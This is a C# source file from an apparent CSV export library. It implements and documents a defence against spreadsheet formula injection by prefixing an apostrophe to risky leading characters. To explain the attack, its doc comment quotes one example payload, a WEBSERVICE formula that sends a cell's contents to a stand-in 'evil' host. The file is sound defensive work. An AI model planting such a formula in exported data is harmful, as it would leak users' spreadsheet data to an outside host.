namespace Craticula.Export.Csv;

/// <summary>
/// EXP-6, verbatim: "CSV formula injection (OWASP): values starting with <c>=</c>, <c>+</c>, <c>-</c>,
/// <c>@</c>, tab, or CR are prefixed with <c>'</c> — default on, configurable off."
///
/// <para><b>What the attack is.</b> A spreadsheet does not treat an imported file as data. Excel,
/// Google Sheets and LibreOffice all interpret a cell whose first character is one of the six above as
/// a formula or a command, so a value a user typed into a filter box or a free-text field — say
/// <c>=WEBSERVICE("http://evil/"&amp;A1)</c> or <c>@SUM(A1:A10)</c> — executes the moment somebody
/// opens the export. The exporting application is the delivery vehicle: nothing about the CSV file
/// itself is malformed, which is why RFC 4180 quoting (EXP-4) does not help at all. Quoting protects
/// the <em>parser</em>; this protects the <em>consumer</em>.</para>
///
/// <para><b>Why the six.</b> <c>=</c> is the canonical formula introducer and <c>+</c>, <c>-</c> and
/// <c>@</c> are the three legacy ones Excel still honours (<c>+</c> and <c>-</c> from Lotus 1-2-3
/// keystroke compatibility, <c>@</c> from its function syntax). Tab and CR are not formula introducers
/// at all: they are here because they are <em>invisible</em>, and a leading whitespace control
/// character is stripped or re-interpreted by the import path of several consumers, which can promote
/// the character behind it to first position. Prefixing pins the value at the position the writer put
/// it in.</para>
///
/// <para><b>Why an apostrophe.</b> It is the spreadsheet's own "this cell is text" marker rather than
/// an escaping scheme of this writer's invention, so no consumer needs to be told about it: the cell
/// is displayed as text and the leading quote is not shown. The cost is that the transformation is not
/// reversible — a value that genuinely began with <c>'</c> and one this method prefixed are the same
/// bytes on disk. EXP-6 accepts that, and it is why the rule is configurable off: a machine-to-machine
/// export whose consumer is a parser and never a spreadsheet wants the raw value. Note that <c>'</c>
/// is not itself a trigger, so a value already beginning with one is left alone and this writer never
/// emits two.</para>
///
/// <para><b>Only the first character is examined.</b> A trigger anywhere else cannot start a formula —
/// <c>a=b</c> is text to every spreadsheet — and prefixing on a contained character would rewrite an
/// enormous share of ordinary data (every hyphenated name, every ISO date) for no gain.</para>
///
/// <para><b>The empty string is never prefixed.</b> There is no first character to neutralise, and an
/// empty field is what <see cref="CsvValueFormatter"/> renders a NULL cell as — turning "no value"
/// into a one-character value would invent data, and the row would no longer round-trip.</para>
///
/// <para><b>This method decides HOW, never WHICH.</b> It hardens whatever text it is handed;
/// <see cref="CsvWriter"/> decides which fields are handed to it, and that scope is narrower than
/// EXP-6's unqualified wording — every header, and every data cell <em>except</em> those the writer
/// formatted from a numeric, temporal or boolean value. The reason is <c>-</c>: it is also the leading
/// character of every negative number, and prefixing <c>-500.25</c> would produce <c>'-500.25</c>,
/// which a spreadsheet renders as text rather than as a number and so corrupts the very data the
/// export exists to deliver.</para>
///
/// <para><b>Do not "simplify" that scope to <c>value is string</c>.</b> It reads as the same rule and
/// is not: the two agree on every type either one names and part company on an unanticipated one, so a
/// text column arriving as a driver's wrapper would be written <em>unhardened</em> with nothing in the
/// output looking wrong. <see cref="CsvWriter.IsInHardeningScope"/> is deliberately an exclusion for
/// that reason and carries the full argument; <c>docs/TRD-grid-query-compiler.md</c>'s EXP-6 records
/// the narrowing normatively.</para>
///
/// <para>Pure and public so it can be graded directly rather than only through the bytes of a whole
/// file: the six triggers, the near misses and the disabled path are one-line assertions here, which
/// is what keeps the conformance fixtures free to test the composition instead of the enumeration.</para>
/// </summary>
public static class FormulaInjectionHardening
{
    /// <summary>The spreadsheet's text marker. A single character, prepended to the field text and
    /// nothing else — the prefix is part of the value from RFC 4180's point of view, which is what makes
    /// it land inside the quotes when the value also needs quoting.</summary>
    private const char TextMarker = '\'';

    /// <summary>
    /// <paramref name="text"/> with a leading <c>'</c> when <paramref name="enabled"/> and its first
    /// character is one of EXP-6's six triggers; <paramref name="text"/> itself in every other case,
    /// including the empty string.
    /// </summary>
    /// <param name="text">One field's text, already formatted (EXP-5) and not yet quoted (EXP-4).</param>
    /// <param name="enabled">EXP-6's "default on, configurable off", resolved by the caller — for the
    /// writer, <see cref="CsvWriterOptions.HardenFormulaInjection"/> combined with whether this
    /// particular field is in the rule's scope.</param>
    public static string Harden(string text, bool enabled) =>
        enabled && text.Length > 0 && IsTrigger(text[0])
            ? TextMarker + text
            : text;

    private static bool IsTrigger(char character) => character is '=' or '+' or '-' or '@' or '\t' or '\r';
}
